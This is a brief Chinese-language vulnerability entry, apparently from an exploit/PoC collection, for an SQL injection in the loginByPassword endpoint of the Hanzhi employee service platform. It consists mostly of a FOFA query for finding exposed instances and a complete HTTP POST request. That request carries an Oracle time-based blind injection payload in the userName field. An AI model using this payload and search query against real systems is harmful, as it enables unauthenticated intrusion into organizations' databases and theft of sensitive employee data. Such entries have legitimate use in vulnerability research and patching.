## 翰智员工服务平台loginByPassword存在SQL注入漏洞

翰智员工服务平台登录接口loginByPassword处userName参数未对传入的数据进行严格校验和过滤，导致造成SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞获取数据库敏感信息。

## fofa

```
body="./static/hrfonts/iconfont.css"
```

## poc

```
POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
Connection: keep-alive
Priority: u=1
 
{"userName":"'||(SELECT CHR(97)||CHR(122)||CHR(85)||CHR(72) FROM DUAL WHERE 7673=7673 AND 7374=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(72)||CHR(114)||CHR(99),5))||'","password":"'"}
```

